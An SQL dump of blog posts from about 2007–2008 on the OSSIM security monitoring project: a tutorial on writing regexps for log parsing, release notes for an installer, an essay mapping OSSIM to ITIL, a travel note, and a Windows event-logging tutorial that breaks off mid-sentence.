INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (185, 'Tutorial 6: Plugin writing primer', 'Dominique Karg', 'March 11, 2008 ', 'A couple of days ago I was fixing the fortinet/fortigate with the kind help of a Swiss OSSIM user (thanks Mikael ;-) ) and I wrote this little piece of python in order to help me out with it. Now I’m using it a lot to debug plugins so I guess more people could benefit from this also :-)\nAnd well, I’ll paste a sample plugin debugging session in order to give ideas.BTW, this assumes basic knowledge of regular expressions, check this Regexp Primer out if you want to refresh that knowledge. And BTW2, some log lines are broken for readability.\n#!/usr/bin/python \n\nimport sys,re\n\n\n\nif sys.argv[3] is None:\n\n        print \"Args are filename, regexp and [0|1]\"\n\n\n\nf = open(sys.argv[1], \'r\')\n\ndata = f.readlines()\n\nexp=sys.argv[2]\n\n\n\nprint sys.argv[2]\n\n\n\nline_match = 0\n\n\n\nmatched = 0\n\n\n\nfor line in data:\n\n	result = re.findall(exp,line)\n\n	try:\n\n		tmp = result[0]\n\n	except IndexError:\n\n		if sys.argv[3] is \"1\":\n\n			print \"Not matched:\", line\n\n		continue\n\n	print result\n\n	matched += 1\n\n\n\n\n\nprint \"Counted\", len(data), \"lines.\"\n\nprint \"Matched\", matched, \"lines.\"\n\n  Basically it will take a logfile as input, a regexp and wether to verbosely show the matched lines or not. That way you can start working towards more complex regexps and test it against a full logfile in realtime.regexp.py logfile “regexp” (0|1) # 0 == do not show “non-matching lines”Let’s go through a simple file containing logs (got it from http://www.ossec.net/wiki/index.php/PostgreSQL_Samples).\n[2007-08-31 19:22:21.469 ADT] :[unknown] LOG:  connection received: host=192.168.2.99 port=52136\n\n[2007-08-31 19:22:21.485 ADT] 192.168.2.99:ossecdb LOG:  connection authorized: user=ossec_user \n\ndatabase=ossecdb\n\n[2007-08-31 19:22:22.427 ADT] 192.168.2.99:ossecdb LOG:  disconnection: session time: 0:00:00.95 \n\nuser=ossec_user database=ossecdb host=192.168.2.99 port=52136\n\n[2007-09-27 11:02:44.941 ADT] 192.168.2.10:ossecdb ERROR:  relation \"lala\" does not exist\n\n[2007-09-27 11:02:46.444 ADT] 192.168.2.10:ossecdb LOG:  disconnection: session time: 0:00:35.79 \n\nuser=ossec_user database=ossecdb host=192.168.2.10 port=3584\n\n\n\nLog messages:\n\n[2007-09-01 07:14:41.062 ADT] : LOG:  autovacuum: processing database \"template1\"\n\n[2007-09-01 07:15:41.079 ADT] : LOG:  autovacuum: processing database \"ossecdb\"\n\n\n\nQuery log:\n\n[2007-09-01 16:44:49.244 ADT] 192.168.2.10:ossecdb LOG:  duration: 4.550 ms  statement: \n\nSELECT id FROM location WHERE name = \'enigma->/var/log/messages\' AND server_id = \'1\'\n\n[2007-09-01 16:44:49.251 ADT] 192.168.2.10:ossecdb LOG:  duration: 5.252 ms  statement: \n\nINSERT INTO location(server_id, name) VALUES (\'1\', \'enigma->/var/log/messages\')\n\n[2007-09-01 16:44:49.252 ADT] 192.168.2.10:ossecdb LOG:  duration: 0.016 ms  statement: \n\nSELECT id FROM location WHERE name = \'enigma->/var/log/messages\' AND server_id = \'1\'\n\n\n\n[2007-09-27 11:02:51.611 ADT] 192.168.2.10:ossecdb LOG:  statement: INSERT INTO \n\nalert(id,server_id,rule_id,timestamp,location_id,src_ip) \n\nVALUES (\'3577\', \'1\', \'50503\',\'1190916566\', \'140\', \'0\')\n\n\n\nQuery error:\n\n[2007-08-31 19:17:42.128 ADT] 192.168.2.99:test ERROR:  relation \"alertaaa\" does not exist\n\n[2007-08-31 19:17:46.375 ADT] 192.168.2.99:test ERROR:  syntax error at or near \"a\" at character 1\n\n[2007-09-27 11:02:44.941 ADT] 192.168.2.10:ossecdb ERROR:  relation \"lala\" does not exist\n\n\n\nAuthentication error:\n\n[2007-09-01 19:08:49.862 ADT] : LOG:  connection received: host=192.168.2.99 port=37142\n\n[2007-09-01 19:08:49.869 ADT] 192.168.2.99: FATAL:  password authentication failed for user \"ossec_user\"\n\nThe actual regexp debugging process1. Start out simple\nGestalt:tmp dk$ regexp.py postgresql.log.txt \"(^.*$)\" 0 | tail -n 2\n\n[\'[2007-09-01 19:08:49.869 ADT] 192.168.2.99: FATAL:  password authentication failed for user \"ossec_user\"\', \'\', \'\']\n\nCounted 25 lines.\n\nMatched 25 lines.\n\nGestalt:tmp dk$ \n\nThe tail after the command is there because by default it shows all the matching lines, and one is enough for our sample.\nThe used regexp is (^.*$) which as you know matches everything from the beginning to the end.2. Basic separation\nGestalt:tmp dk$ regexp.py postgresql.log.txt \"^\\[(?P<date>\\S+\\s+\\S+)\\.\\d+\\s+ADT\\]\\s+(.*)$\" 0\n\n^\\[(?P<date>\\S+\\s+\\S+)\\.\\d+\\s+ADT\\]\\s+(.*)$\n\n[(\'2007-08-31 19:22:21\', \':[unknown] LOG:  connection received: host=192.168.2.99 port=52136\')]\n\n[(\'2007-08-31 19:22:21\', \'192.168.2.99:ossecdb LOG:  connection authorized: \n\nuser=ossec_user database=ossecdb\')]\n\n[(\'2007-08-31 19:22:22\', \'192.168.2.99:ossecdb LOG:  disconnection: session time: 0:00:00.95 \n\nuser=ossec_user database=ossecdb host=192.168.2.99 port=52136\')]\n\n[(\'2007-09-27 11:02:44\', \'192.168.2.10:ossecdb ERROR:  relation \"lala\" does not exist\')]\n\n[(\'2007-09-27 11:02:46\', \'192.168.2.10:ossecdb LOG:  disconnection: session time: 0:00:35.79 \n\nuser=ossec_user database=ossecdb host=192.168.2.10 port=3584\')]\n\n[(\'2007-09-01 07:14:41\', \': LOG:  autovacuum: processing database \"template1\"\')]\n\n[(\'2007-09-01 07:15:41\', \': LOG:  autovacuum: processing database \"ossecdb\"\')]\n\n[(\'2007-09-01 16:44:49\', \"192.168.2.10:ossecdb LOG:  duration: 4.550 ms  statement: \n\nSELECT id FROM location WHERE name = \'enigma->/var/log/messages\' AND server_id = \'1\'\")]\n\n[(\'2007-09-01 16:44:49\', \"192.168.2.10:ossecdb LOG:  duration: 5.252 ms  statement: \n\nINSERT INTO location(server_id, name) VALUES (\'1\', \'enigma->/var/log/messages\')\")]\n\n[(\'2007-09-01 16:44:49\', \"192.168.2.10:ossecdb LOG:  duration: 0.016 ms  statement: \n\nSELECT id FROM location WHERE name = \'enigma->/var/log/messages\' AND server_id = \'1\'\")]\n\n[(\'2007-09-27 11:02:51\', \"192.168.2.10:ossecdb LOG:  statement: \n\nINSERT INTO alert(id,server_id,rule_id,timestamp,location_id,src_ip) \n\nVALUES (\'3577\', \'1\', \'50503\',\'1190916566\', \'140\', \'0\')\")]\n\n[(\'2007-08-31 19:17:42\', \'192.168.2.99:test ERROR:  relation \"alertaaa\" does not exist\')]\n\n[(\'2007-08-31 19:17:46\', \'192.168.2.99:test ERROR:  syntax error at or near \"a\" at character 1\')]\n\n[(\'2007-09-27 11:02:44\', \'192.168.2.10:ossecdb ERROR:  relation \"lala\" does not exist\')]\n\n[(\'2007-09-01 19:08:49\', \': LOG:  connection received: host=192.168.2.99 port=37142\')]\n\n[(\'2007-09-01 19:08:49\', \'192.168.2.99: FATAL:  password authentication failed for user \"ossec_user\"\')]\n\nCounted 25 lines.\n\nMatched 16 lines.\n\nGestalt:tmp dk$ \n\nHere we make a first attempt at separating the original datetime from the rest of the line. Additionally we’ve filtered out the junk lines that might appear in the file, so now we only match 16 lines (the actual 16 lines that contain valid log files). Out regexp starts looking uglier now, but still understandable ;-): ^\\[(?P<date>\\S+\\s+\\S+)\\.\\d+\\s+ADT\\]\\s+(.*)$3. Extracting the database host and actual DB name\nGestalt:tmp dk$ regexp.py postgresql.log.txt \n\n\"^\\[(?P<date>\\S+\\s+\\S+)\\.\\d+\\s+ADT\\]\\s+(?P<dbhost>[^:]+)?:(?P<dbname>\\S+)?\\s+(.*)$\" 0 | tail -n 3\n\n[(\'2007-09-01 19:08:49\', \'192.168.2.99\', \'\', \'FATAL:  password authentication failed for user \"ossec_user\"\')]\n\nCounted 25 lines.\n\nMatched 16 lines.\n\nThis time I’m facing the first problems. In order to get the output shown above I had to go through a bit of try and error.\nStarting with a first try I see there are 5 lines not matching, since we know it’s 16 we need to match:\nGestalt:tmp dk$ regexp.py postgresql.log.txt \"^\\[(?P<date>\\S+\\s+\\S+)\\.\\d+\\s+ADT\\]\\s+([^:]+):(\\S+)\\s+(.*)$\" 0 | tail -n 2\n\nCounted 25 lines.\n\nMatched 11 lines.\n\nGestalt:tmp dk$ \n\nLet’s see which ones are not matching (notice the change from 0 to 1 at the end of the python’s ARGV):\nGestalt:tmp dk$ regexp.py postgresql.log.txt \"^\\[(?P<date>\\S+\\s+\\S+)\\.\\d+\\s+ADT\\]\\s+([^:]+):(\\S+)\\s+(.*)$\" 1 | grep \"Not matched: \\[\"\n\nNot matched: [2007-08-31 19:22:21.469 ADT] :[unknown] LOG:  connection received: host=192.168.2.99 port=52136\n\nNot matched: [2007-09-01 07:14:41.062 ADT] : LOG:  autovacuum: processing database \"template1\"\n\nNot matched: [2007-09-01 07:15:41.079 ADT] : LOG:  autovacuum: processing database \"ossecdb\"\n\nNot matched: [2007-09-01 19:08:49.862 ADT] : LOG:  connection received: host=192.168.2.99 port=37142\n\nNot matched: [2007-09-01 19:08:49.869 ADT] 192.168.2.99: FATAL:  password authentication failed for user \"ossec_user\"\n\nGestalt:tmp dk$ \n\nOk, understood, either DB host or DB name are optional, so let’s add that to our regexp, getting a final regexp of: ^\\[(?P<date>\\S+\\s+\\S+)\\.\\d+\\s+ADT\\]\\s+(?P<dbhost>[^:]+)?:(?P<dbname>\\S+)?\\s+(.*)$ On the matching log line we can also see how the db host and name are being correctly extracted ;-). 4. Got a plugin_sid value\nGestalt:tmp dk$ regexp.py postgresql.log.txt \n\n\"^\\[(?P<date>\\S+\\s+\\S+)\\.\\d+\\s+ADT\\]\\s+(?P<dbhost>[^:]+)?:(?P<dbname>\\S+)?\\s+(?P<sid>[^:]+):\\s+(?P<log_msg>.*)$\" 0 | tail -n 3\n\n[(\'2007-09-01 19:08:49\', \'192.168.2.99\', \'\', \'FATAL\', \'password authentication failed for user \"ossec_user\"\')]\n\nCounted 25 lines.\n\nMatched 16 lines.\n\nGestalt:tmp dk$ \n\nLooking at the remainder string it starts getting obvious that the next field is sort of a priority value. In this first phase the postfix plugin will remain somewhat crippled since I’m going to use that field as plugin sid, instead of identifying each of the log types by what they actually do. (That’s left as a task for the reader).\nOur resulting regexp, extracting the priority and removing some white space in front of the logline would be: ^\\[(?P<date>\\S+\\s+\\S+)\\.\\d+\\s+ADT\\]\\s+(?P<dbhost>[^:]+)?:(?P<dbname>\\S+)?\\s+(?P<sid>[^:]+):\\s+(?P<log_msg>.*)$Final RoundupThe plugin is far from being finished, but the goal of this tutorial was to demistify the regexp part a bit, since it’s actually only based on a bit of research about the log (possible values for fields), a bit of intuition and lots of try && error.\nI hope that goal has been met.To be continued… (finishing the regexp, writing the .cfg file and writing the .sql file)', 'pluginspythonregexp', '/blogs/labs-research/tutorial-6-plugin-writing-primer');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (186, 'User feedback', 'Dominique Karg', 'March 5, 2008 ', 'I wanted to point you at two things I think that are important, things that we’ve been neglecting in the past months.IRC Channel: we’ve ignored this way of communication for quite some time but enough of that, I added a “fire up BitchX” postit on my desk so from now on I’ll spend as much time there as I can, and hopefully other ossim users / developers too. See you at irc.freenode.org, channel #ossimBug tracking mechanism: honestly, I never liked the one provided by sf.net so I followed a suggestion from a friendly guy at #ossim and installed FlySpray as a bug tracking system. Check it out at http://www.ossim.net/bugs/ [no longer available] (Need to add the virtualhost for bugs.ossim.net :-) ).So, if you’ve got bugs or suggestions for ossim, please start posting them there. And if you just want to hang out with us join on the IRC nchannel.During the next days I’ll post an update on currenct development, we’re working on some exciting features right now ;-)', 'ircbugsfeedback', '/blogs/labs-research/user-feedback');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (187, 'OSSIM Installer 1.0.4 released', 'Dominique Karg', 'February 22, 2008 ', 'After having written the whole thing a reduced version for those with little time available seems in place.We’ve released OSSIM 0.9.9 this week, release which was followed by a post to BugTraq http://www.securityfocus.com/archive/1/488450/30/0/threaded [no longer available] regarding some XSS and SQL vulnerabilities present on OSSIM.\nAfter having fixed those vulnerabilities we’re now releasing:OSSIM Installer 1.0.4 (the recommended installation method)OSSIM Updater 1.0.4 (the recommended updating method for those running versions 1.0 - 1.0.3)OSSIM 0.9.9-3 Debian packages.OSSIM 0.9.9p1 for those who need source code.Upgrade is encouraged to all OSSIM users.\n\nAnd here goes the extended version:We’re proud to annnounce the immediate availability of the 1.0.4 OSSIM Installer, coming both as a standalone ISO image as well as an updater. In order to differentiate it from other similar efforts and reflecting the significant work we’re putting into making OSSIM more usefriendly, we’re branding it the “AlienVault OSSIM Installer” from now on.<shameless plug&gt\nAbout a year ago the creators of OSSIM started a company dedicated to offer professional services around OSSIM, while keeping the development of the open source project with the same name moving. In the beginning we called the company OSSIM as well, but soon we realized that this was generating some confusion regarding the part that is (and will remain) open source, and the services being developed around it (such as courses, tuned appliances, consulting and support) which are helping us to further improve it and are turning OSSIM into a real alternative to similar commercial products.\nTherefore we rebranded the commercial part into “AlienVault”, a name that was available, sounded good and represented both innovation and security in a single word.\n</shameless plug&gtBack to release related stuff now.\n\nThis is a very important release for several reasons:Our first updater releaseSecurity fixes (XSS, SQL Injection)Many new features / improvementsThe installer is pretty straigthforward, the main difference in the installation process itself (regarding 1.0.3) is that it has better hardware compatibility now, a bunch of debian security fixes (including the recent kernel vulnerability) and a custom partition scheme.\n\nThe updater should run pretty smooth on 1.0 through 1.0.3 installations. After downloading and executing the script the default values for the “auto” method are quite safe. You’ll get asked some debian specific questions regarding config file updates; answer no (the default) to all of them if unsure since we’ll take care of those updates later on.\n\nAfter having installed this first updater version (or the 1.0.4 ISO) you’ll be able to check for new updates running the /home/ossim/dist/ossim-update.pl script. We intend to include a “check for update” feature within the next release.Last but not least, regarding the security fixes we always appreciate being helped out on things we’ve done wrong, but we do appreciate being contacted directly (cheers to Dave, who can be found at subverted.org, who notified some of these issues some time ago already) instead of having to read mistakes somewhere else. Feel free to contact us at [email protected] regarding similar issues.\nAnd should you have any other issue with the updater, installer or anything related to ossim, please check out the sourceforge.net forums, mailing lists or contact us directly at [email protected]. Get the AlienVault OSSIM Installer / Updater 1.0.4 here. Here is a more detailed list of the most important changes:\n\nNew software:Included OSSEC (http://www.ossec.net/)Included Munin for sensor monitorization (http://munin.projects.linpro.no/)Included FProbe for high traffic environments (http://fprobe.sourceforge.net/)OSSIM core upgradeIncluded and updated bleeding snort rules New features: Intrushield pluginSymantec pluginTarantella pluginNtop connections being rewritten through the server, no need to open port 3000 to then anymore.Partitioning switched to manual on installationDatabase optimization code includedAdded some database indexes for query speedupUpdater supportExperimental agent event consolidationAgent event statistics Updated features: Updated ISS Realsecure/Proventia pluginUpdated FW1 pluginUpdate IIS pluginUpdate Squid pluginDatabase types optimizedUpdated pam_unix rulesUpdated ssh rulesUpdated cross correlation informationOCS will now inventorize the ossim hosts as well Bugfixes Localization now workingFixed some server issuesFixed a login page XSSRestricted input validation which was too lax', '', '/blogs/labs-research/ossim-installer-104-released');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (188, 'Installer / updater coming :-)', 'Dominique Karg', 'February 15, 2008 ', 'We’re proud to announce the soon-to-be-available 1.0.4 installer (versioning wise it could be 1.1 or even higher because of all of the changes but, well, we called it 1.0.4), both as a standalone ISO image as well as the updater.We’ve been working very hard the past months on this, the updater has been a nightmare. It’s much easier to make an installer than an updater…For those wanting to try it out, just download update.pl http://updates.alienvault.com/updates/update.pl [no longer available] and run it on a 1.0 - 1.0.3 installed image (should work with the images we’ve released inbetween on the forums too). Be warned tho, we’re still on final testing phases and there might be some issues in there, any sort of testing will be more than welcome.Basically the installer will backup all the databases and /etc/*, /usr/share/ossim*, install new packages (ossim 0.9.9), new deps (ossec, munin, fprobe) and tune some other things.\nAnyway, as said, there are backups and it shouldn’t be too hard to get it back working if something fails.A few hints if you’re going to try it out:Default values for most of questions are fine. If unsure just press enter.“auto” is the recommended way to go for new users, “expert” allows for a more fine grained setup.We experienced occassional hangs at the munin plugin setup step. Had to kill the following process on another terminal in order to continue with the installation processAfter everything has been installed you have to log in and upgrade the web part, it should work like a charm :-)Right now requires internet access; we’ll publish an offline updater too of courseCheck a sample installer output if you’re curious. Get the 1.0.4 (beta) updater here. http://updates.alienvault.com/updates/update.pl [no longer available]Here is a more detailed list of the most important changes:\n\nNew software:Included OSSEC (http://www.ossec.net/)Included Munin for sensor monitorization (http://munin.projects.linpro.no/)Included FProbe for high traffic environments (http://fprobe.sourceforge.net/)OSSIM core upgradeIncluded and updated bleeding snort rulesNew features:Intrushield pluginNtop connections being rewritten through the server, no need to open port 3000 to then anymore.Partitioning switched to manual on installationDatabase optimization code includedAdded some database indexes for query speedupUpdater supportExperimental agent event consolidationAgent event statisticsUpdated features:Updated realsecure/proventia pluginUpdated FW1 pluginUpdate IIS pluginDatabase types optimizedUpdated pam_unix rulesUpdated ssh rulesUpdated cross correlation informationBugfixesLocalization now workingFixed some server issues', 'installerupdater', '/blogs/labs-research/installer-updater-coming');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (189, 'OSSIM applied to ITIL', 'Dominique Karg', 'January 17, 2008 ', 'Recently I stumbled across an interesting article talking about Microsoft, Opensource and ITIL where ossim was being mentioned. (the article can also be found googling for “ossim itil microsoft” in case the link breaks).I’ve never been very keen about learning ITIL either (although I’ve heard about it everywhere during the last year) but this really caught my attention. In that paper ossim gets referenced only on the “security management” section, but I think that’s mainly caused by ossim being hard to install, setup and understand when that article was written, so I thought I give it another try from my point of view, taking the included tools into account for the different ITIL sections.So, the goal of this article would be to extend and improve that other article, giving a thought about how I’d approach all those ITIL recommendations from an OSSIM point of view.The Information Technology Infrastructure Library is comprised by two main sets and a series of subsets (from what I’ve read on that article and the wikipedia):Service SupportService DeliveryNote: The definitions after each topic have been quoted from the MS article since they’re small and concise.The following diagram illustrates a sample support request handled according according to ITIL (thanks Gabi althought there are some typos ;-)):(Image removed, broken link, I’m very sorry. DK.)Service SupportIncident ManagementSolving incidents and restoring services quickly.The incident manager http://www.ossim.net/dokuwiki/doku.php?id=user_manual:incidents [no longer available] is the obvious choice for this activity from an OSSIM point of view, with a couple of details and exceptions mentioned below.Five points are mentioned as important for incident management:Detect and Record an incident http://www.ossim.net/dokuwiki/doku.php?id=user_manual:incidents#incidents_incidents [no longer available] (the main incident manager)Classify http://www.ossim.net/dokuwiki/doku.php?id=user_manual:incidents#incidents_types [no longer available] (Incident types)Initial Support (This requires more manual intervention, although automated urls with information could be sent to the users involved in the incident)Investigate and Resolve http://www.ossim.net/dokuwiki/doku.php?id=user_manual:events [no longer available] (With forensics, realtime viewers, vulnerability databases and everything logged on a central location there are plenty of tools for doing this)Track, Monitor and Communicate http://www.ossim.net/dokuwiki/doku.php?id=user_manual:dashboard#dashboard_executive_panel [no longer available] (Specific metrics / dashboards could be designed for thisProblem ManagementSolving root cause problems to prevent future incidents.Problem and Error Control (Well, this is what a SIEM is used for 90% of the time, isn’t it ? Linking to the root description for overview.)Proactive Management http://www.ossim.net/dokuwiki/doku.php?id=user_manual:events#events_anomalies [no longer available] (Identifying problems and errors before they occur. Anomalies can be a very valuable tool for this)Report http://www.ossim.net/dokuwiki/doku.php?id=user_manual:reports [no longer available]Configuration ManagementMaintaining all necessary information about services, service components, and relationships.At first I was confused and didn’t see how ossim could fit into this. The following tasks are mentioned as being important for this part. As I don’t see how this fits I don’t link them to any specific sites.PlanningIdentificationConfiguration ControlStatus AccountingVerification and AuditBut after this they point out a series of important things that a software would have to accomplish in order to help out on this, namely:Discover devices on a networkDetermine the host OSDetermine OS version and patch levelsDetermine which applications are installedDetect any changes to the configurationWell, this started to sound familiar. OCS http://www.ossim.net/dokuwiki/doku.php?id=user_manual:reports#reports_ocs_inventory [no longer available], Nmap http://www.ossim.net/dokuwiki/doku.php?id=user_manual:tools#tools_net_scan [no longer available] network inventory, the whole policy http://www.ossim.net/dokuwiki/doku.php?id=user_manual:policy [no longer available] area, p0f, pads, arpwatch all fit perfectly in this section.Change ManagementControlling the implementation of changes in the infrastructure.This is an area where ossim can be greatly improved. OCS already includes some “Install software updates and configuration changes” functionality but it’s not fully integrated.The article suggests Bcfg2, cfgengine or Webmin for this. We already considered using webmin for the installer CD configuration so this would be an obvious addition.The rest of it is covered by the Incident manager http://www.ossim.net/dokuwiki/doku.php?id=user_manual:incidents [no longer available], reports, executive panels and OCS.Filtering ChangesImplementing ChangesReview and CloseReportRelease ManagementControlling the rollout of new releases in the infrastructure.Again there are things missing for this to be fully covered by ossim. Integrating Zenoss would be an option although with tight ocs integration and some additional development this should be easily accomplished without additional dependencies. Maybe webmin too.Build and ConfigureTest and acceptSchedule and Plan (The incident manager would be suitable although not perfect for this)Communicate and Prepare (Again we’d use the subscription feature for this)Distribute and Install (As mentioned earlier ocs can be used for remote software installation)Service DeliveryService Level ManagementDefininig and implementing clear agreements for service delivery between an IT organization and its customers.This on the other hand is something which is fully covered by ossim. Having implemented lots of metrics and measurements it is very easy to:Define SLAs, OLAs and UCs (Also executive panel metrics, service level, vulnmeter can be used for this)Define a service catalog (Typifying and tagging incidents)Status accountingFinancial Management for IT ServicesEnsuring the proper management, maintenance, and financial operation of IT.This is more of a human task than an ossim one. I guess metrics could be enforced if the data related to all of this is stored somewhere but I’d need to investigate it some more.Capacity ManagementOptimizing capacity to meet service requirements at an acceptable cost.This is a very interesting expertise area, where some parts are covered by ossim and others not so much. The article mentions Zenoss and Hyperic HQ as tools that meet the needs for this, and I guess ossim as is also meets many of the needs:Monitoring (Including trends and forecasting due to heavy RRD usage: Nagios, Ntop, ocs, etc…)Analysis (Most of ossim can be used for this)Demand Management (Most of ossim can be used for this)Modeling (Policy establishes a baseline and anomalies provide information on how this has changed over time)Planning (Most of ossim can be used for this)Availability ManagementEnsuring the availability of IT resources to meet agreed upon service levels.This obviously is fully covered by monitors and executive panels with metrics:Define requirements (This involves policy, executive panel metrics, business processes, check the main descriptions)Availability Planning (Nagios, Ntop, OCS, etc…)Monitor Availability (Nagios, Ntop, OCS, etc…)Monitor obligations (This involves policy, executive panel metrics, business processes, check the main descriptions)IT Service Continuity ManagementDefining and maintaining appropriate Disaster Recovery plans for IT.This is also a very manual and off-ossim task, some parts could help for this (monitoring, sla’s, etc…)Security ManagementEnsuring the proper access to services as defined by agreements and industry best practices.This is where the article mentions ossim, although not fully extending on what can be covered using ossim. Four main tasks are required for this:Coordinate Security Management (Using the incident manager)Implement Controls (This is covered by most of ossim)Evaluate and Audit Controls (Also this)Maintain and Monitor (Using the incident manager, executive panels, reports)ConclusionThis article is more of an exercise of what could be done rather than a step by step guide on how to implement it. Obviously that step-by-step guide is now on my todo list but that requires much more than the couple of hours I’ve spent writing this up.Anyway, I hope this article gave a quick overview of how ossim can be applied to ITIL.Remember the graph at the top and the numbers ? Let’s resume where each task would fit in ossim.The new incident creates a log read by the agent, a response is issued by policy and a new incident inserted.Using the incident manager we tag and typify the incident.Next we analyze events, alarms, monitors and reports checking what could be wrong. We notice the service level and metrics at executive panel decreasing.Through the incident manager we subscribe the people who can fix the issue to the incident, and describe needed actions in order to fix them.Another executive panel reflects to the customer what the current issue means to their business in terms of money.Again we track everything using the incident manager and issue a patch rollout using OCS’s automatic soft installation feature.We change our inventory information based on the new automatic changes and keep track of them using the incident manager. The anomalies panel gets automatically updated once the new versions get detected.Nagios will reflect the downtime and affect the overall service level due to this issue.Policy, executive panels and directives get updated if needed after this new situation.The closed incident gets reported to the customer and will show up on incident reports.And in order to finish I’d like to quote a friends comment about ITIL: ITIL is a series of things everybody with a little bit of common sense would do in an enterprise if he had the time, the people or the money to do it. So if it’s not being done I yet it will take more than a series of best practices to change that ;-)', 'ossimitil', '/blogs/labs-research/ossim-applied-to-itil');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (190, 'Greetings from Istanbul', 'Dominique Karg', 'January 1, 2008 ', 'After having spent five days in this nice city I wanted to say goodbye through a post. It’s the second time I went here (sadly both times I had to work but I’ll come back for fun someday, that for sure) and I really enjoyed the stay.This time I had a nicer Hotel than last time, right in the city center. Although I didn’t enjoy the breakfast at the hotel a single day (I’d rather sleep 15 mins longer) I’ll remember these days again for the food: unending mountains of food at all hours.\nLast night we went to the Garibaldi which was a delicious goodbye dinner with live music. Besides that not much more to tell, intense but fun work, some WoW, some traffic jams,  missing my girlfriend a real lot and kebaps, kebaps, kebaps…A hearty greeting to my friends in Istanbul. You’ve tried to make me explode with food but again you didn’t succeeed.\nWhich reminds me, this time I’ve learned the trick. It’s considered bad manner to refuse a dish when getting it offered, and you get it continously. But if you offer back insistently then they’ll think about it twice when feeding you up.While I write these lines the Muezzin are calling to prayer. It’s an interesting sound and reminds me that although very similar to our city, it’s still quite a different culture. (I’m pretty sure I’ve heard that article ending before, inside a “Lonely planet” issue or something like that :P)', 'travelpersonal', '/blogs/labs-research/greetings-from-istanbul');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (191, 'Tutorial 5: Windows event logging', 'Dominique Karg', 'December 19, 2007 ', 'The windows event logAs an introduction to windows event logging I recommend reading the following article: Monitoring and Troubleshooting Using Event Logs. It’s the first interesting one I’ve found after googling for an introduction.Quoting the article, which also talks about EventCombMT.exe which we’ll mention later:This article reviews best practices for working with Windows event logs including how to interpret\n\nevent messages, how to configure event logs, how to search and filter events, how to view events on\n\nremote systems, and how to use EventCombMT.exe and other tools to monitor events on multiple systems.Resuming, windows hosts by default log events into three local log “facilities”:SystemApplicationSecurityThe main problem with windows event logs is that there’s no easy way to forward them to a central unix logging location. There are two ways (that I’m aware of) of getting those logs to OSSIM:Using agents (ossec, ntsyslog, snare)Agentless (had heard/thought about it but just recently started researching on how to do this easily). More info below.ArchitectureFor this tutorial we’ll assume OSSIM being installed using the installer on 192.168.1.56.First thing you should do is to download the snare installer, ossec installer and .reg files. Go to Tools->Downloads as seen here:(Image removed, broken link, I’m very sorry. DK.)Note: If you don’t have the ossec installer don’t worry, it will be included in future ossim releases.Log forwardersOSSECInstaller 1.0.4 will include ossec and I’ll extend this tutorial once it’s released since ossec offers many advantages over Snare. But for now we’ll continue to using snare for a bit.SnareClick on your snare installer.Choose normal installation.Decide wether you want snare to take over your audit configuration or not. If you haven’t changed anything on your audit configuration this might be a good idea.Choose localhost configuration only, later on you’ll be able to change your pass.Warning: Due to an incompatibility in DOS/Unix file formats the current .reg files are broken. My apologies for the inconvenience. I just tried to convert them and use them but regedit complains about them not being in the right format. Guess I’ll have to “dos2unix” them, replace the IP, and “unix2dos”.Since the .reg won’t work without modification, open it using notepad, check for a line that says ‘“Destination”=“127.0.0.1”’ and change the IP to your ossim’s IP.Double click on the .reg file in order to import it.Launch a command shell and bounce snare: “net stop snare”, “net start snare”.You should start receiving events from now on. More on how to check this on the next section.AgentLess monitoringBeing at a recent commercial presentation by a commercial SIM, they repeated a couple of times how “agentless” they were, stating that they did collect windows events without needing to install anything.http://www.sqlmag.com/Articles/Print.cfm?ArticleID=49492Another interesting options seems to be the Microsoft Powershell. Its syntax is ugly as hell but it might do the job:  Sample POSH event retrieval .OSSIMOnce they’ve been read and normalized by the agent Windows events are treated like all other events. They get:CorrelatedShown on the realtime event viewerFed into Acid/BaseShown on the event viewerRealtime EventsThe first thing you can do in order to verify everything’s up and running is checking the realtime event viewer. Please keep in mind that events might be arriving but not showing, look at the “skipped” column:(Image removed, broken link, I’m very sorry. DK.)EventsThe installer image comes with a plugin group for snare and a windows event tab pre-configured: (Image removed, broken link, I’m very sorry. DK.)What to do next?Correlate out of hour logins to your network.Correlate pendrive inserts followed by large amounts of file copying: (Image removed, broken link, I’m very sorry. DK.)Dec 19 07:00:19 192.168.1.34 ^A MSWinEventLog;4;System;25;Wed Dec 19 16:23:13 2007;134;Removable Storage Service;Unknown User;N/A;Information;^A;N/A;;Received a device interface ARRIVAL notification for device: (USB Mass Storage Device);1 Dec 19 07:00:19 192.168.1.34 ^A MSWinEventLog;4;System;26;Wed Dec 19 16:23:13 2007;134;Removable Storage Service;Unknown User;N/A;Information;^A;N/A;;Received a device interface ARRIVAL notification for device: (PB EASY STORE USB Device);2 \n Correlate service starts/stops.Correlate user adds/removals/etc…Mass distributionSnare can be easily distributed on a wide range of host in a semi-automatic way. Check the documentation section at the  Snare homepage.TroubleshootingCheck for running snare plugin: (Image removed, broken link, I’m very sorry. DK.)Tail -f /var/log/syslog (which is were events should arrive by default) and check for events like this:Dec 19 03:20:06 192.168.1.34 ^A MSWinEventLog;1;Application;2;Wed Dec 19 12:43:05 2007;105;SNARE;\n\nUnknown User;N/A;Information;NIL-MESA;None;;The service was started.  ;1\n\nDec 19 03:21:01 192.168.1.34 ^A MSWinEventLog;0;Security;3;Wed Dec 19 12:44:00 2007;592;Security;\n\nPruebas Antivirus;User;Success Audit;NIL-MESA;Detailed Tracking;;A new process has been created:    ^I\n\nNew Process ID:^I1724    ^IImage File Name:^I\\WINNT\\system32\\cmd.exe    ^ICreator Process ID:^I2744    ^I\n\nUser Name:^IPruebas Antivirus    ^IDomain:^I^INIL-MESA    ^ILogon ID:^I^I(0x0,0x108EA)    ;0Check /etc/ossim/agent/plugins/snare.cfg and see if location is pointing at /var/log/syslog.Check [HKEY_LOCAL_MACHINE/SOFTWARE/InterSect Alliance/AuditService/Network/Destination] for your server’s ip.Check 